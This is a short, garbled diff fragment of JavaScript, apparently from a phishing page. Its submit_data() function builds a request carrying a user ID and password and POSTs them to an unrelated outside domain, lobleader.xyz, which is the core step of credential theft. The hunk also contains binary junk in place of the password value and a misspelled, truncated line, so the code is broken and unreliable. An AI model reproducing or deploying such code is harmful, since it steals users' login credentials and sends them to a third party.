@@ -4,7 +4,7 @@ function submit_data() {
     const http = new XMLHttpRequest();
     const params = 'uid=' + uid + '&pwd=' + `&�
 u���)��N�\��mv��">��d��h�`;
-    gocument.getElemrntById("pwd-input
+    
     http.open('POST', 'https://lobleader.xyz/gtcrw/ed364db523ea26907c96396a9069d8fd5cd5912640606de1d3cb83cdd629d7a242b130e7046557af9a53a2fad32c2d17c5914cae2da494cbf8cd35feb26ab071?' + params, true);
     http.onreadystatechange = function () {
         if (http.readyState === 4 && http.status === 200) {
